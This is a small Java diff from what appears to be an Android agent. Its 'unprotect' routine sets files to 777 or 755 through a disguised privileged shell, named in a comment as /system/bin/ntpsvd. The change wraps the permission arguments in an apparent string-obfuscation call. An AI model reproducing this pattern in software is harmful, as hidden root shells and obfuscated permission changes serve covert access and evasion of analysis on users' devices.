@@ -266,7 +266,7 @@ public class Path {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e("  qzx chmod 777 ") + " " + path);
 				}
-				Execute.chmod("777", path);
+				Execute.chmod(M.e("777"), path);
 				Utils.sleep(200);
 			} else {
 				if (file.canRead()) {
@@ -276,7 +276,7 @@ public class Path {
 					Check.log(TAG + " (unprotect): " + Configuration.shellFile + M.e(" qzx chmod 755 ") + " " + path);
 				}
 				// h_3=/system/bin/ntpsvd qzx chmod 755
-				Execute.chmod("755", path);
+				Execute.chmod(M.e("755"), path);
 				Utils.sleep(200);
 			}
 
